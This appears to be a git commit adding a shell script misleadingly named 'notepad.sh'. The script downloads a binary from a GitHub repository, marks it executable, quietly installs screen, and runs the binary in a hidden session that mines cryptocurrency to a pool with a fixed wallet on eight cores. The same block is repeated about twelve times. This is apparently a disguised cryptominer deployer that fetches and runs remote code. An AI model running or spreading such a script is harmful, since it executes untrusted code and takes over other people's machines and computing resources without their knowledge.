3c04a49fa5ea77295d81bae4527bc98cca459f97
obisumila <obisumila@gmail.com>
2024-09-24 15:44:33 +0800

    Add files via upload

---
+++ notepad.sh
@@ -0,0 +1,117 @@
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/psychic-octo-waffle/raw/refs/heads/main/kolaka ;
+chmod +x kolaka ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S go -dm ./kolaka --url ws://tw-pool.com:5487/mine mine --username G35z25sTySpFq5wHXYLqNQSRBdkVkLMFdY74Fc2u2xDF.SURE --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
